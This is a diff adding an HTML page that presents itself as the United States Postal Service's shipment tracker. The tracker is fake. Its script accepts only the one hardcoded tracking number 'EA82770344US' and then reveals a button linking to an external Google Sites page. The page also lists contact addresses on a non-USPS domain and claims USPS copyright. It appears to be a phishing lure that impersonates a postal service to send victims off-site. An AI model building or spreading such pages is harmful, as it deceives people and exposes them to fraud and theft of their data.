@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Global Logistics & Shipping Services</title>
+    <style>
+        body { font-family: 'Segoe UI', Arial, sans-serif; line-height: 1.6; color: #333; margin: 0; padding: 0; background: #f4f7f6; }
+        header { background: #005032; color: white; padding: 60px 20px; text-align: center; }
+        .hero-content { max-width: 800px; margin: auto; }
+        
+        .main-container { max-width: 1000px; margin: 40px auto; padding: 0 20px; }
+        
+        /* Integrated Tracker */
+        .tracker-wrapper { background: #0f172a; padding: 40px; border-radius: 15px; color: white; margin-bottom: 40px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
+        .input-group { margin-bottom: 20px; }
+        input { width: 100%; padding: 15px; border-radius: 8px; border: none; margin-top: 8px; }
+        button { width: 100%; padding: 15px; background: #2563eb; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        
+        /* Grid Layout for Features */
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; }
+        details { background: white; padding: 20px; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 15px; }
+        summary { font-weight: bold; cursor: pointer; font-size: 1.1em; }
+        
+        footer { background: #333; color: white; padding: 40px; text-align: center; margin-top: 50px; }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="hero-content">
+        <h1>UNITED STATES POSTAL SERVICE</h1>
+        <p>Connecting people and businesses across the nation with reliability and speed.</p>
+    </div>
+</header>
+
+<div class="main-container">
+    <!-- Tracker Section -->
+    <section class="tracker-wrapper">
+        <h2 style="text-align:center;">Track Your Shipment</h2>
+        <div class="input-group">
+            <label>TRACKING NUMBER</label>
+            <input type="text" id="tracking" placeholder="Enter your 12-digit tracking number">
+        </div>
+        <button type="button" onclick="verifyTracking()">VERIFY TRACKING NUMBER</button>
+        <div id="error" style="color:#fca5a5; text-align:center; margin-top:15px; display:none;">Invalid Tracking Number</div>
+        <a id="openLink" href="https://sites.google.com/view/transitusps/home" target="_blank" style="display:none; text-decoration:none;">
+            <button style="margin-top:20px; background:#005032;">TRACK YOUR PARCEL</button>
+        </a>
+    </section>
+
+    <!-- Info Grid -->
+    <div class="grid">
+        <section>
+            <h2>Support Resources</h2>
+            <details>
+                <summary>Shipping Rates Calculator</summary>
+                <p>Use our online calculator to get precise quotes based on weight, destination, and service speed.</p>
+            </details>
+            <details>
+                <summary>International Customs</summary>
+                <p>Required documentation for international shipments, including prohibited item lists and country-specific taxes.</p>
+            </details>
+            <details>
+                <summary>Business Solutions</summary>
+                <p>Scale your operations with our bulk mail, drop-shipping, and commercial postage account services.</p>
+            </details>
+        </section>
+
+        <section style="background: white; padding: 25px; border-radius: 8px;">
+            <h2>Contact Information</h2>
+            <p><strong>Customer Care:</strong> 1-800-275-8777</p>
+            <p><strong>Technical Support:</strong> 1-800-522-9085</p>
+            <p><strong>General Email:</strong> support@usps-services.com</p>
+            <p><strong>Claims Department:</strong> claims@usps-services.com</p>
+            <hr>
+            <p><small>Our professional support team is available Monday through Friday, 8:00 AM to 8:00 PM EST to assist you with any inquiries.</small></p>
+        </section>
+    </div>
+</div>
+
+<footer>
+    <p>&copy; 2026 United States Postal Service. All rights reserved.</p>
+    <p>Privacy Policy | Terms of Service | Security Notice</p>
+</footer>
+
+<script>
+    function verifyTracking(){
+        const tracking = document.getElementById("tracking").value.trim().toUpperCase();
+        if(tracking === "EA82770344US"){
+            document.getElementById("error").style.display = "none";
+            document.getElementById("openLink").style.display = "block";
+        } else {
+            document.getElementById("openLink").style.display = "none";
+            document.getElementById("error").style.display = "block";
+        }
+    }
+</script>
+
+</body>
+</html>
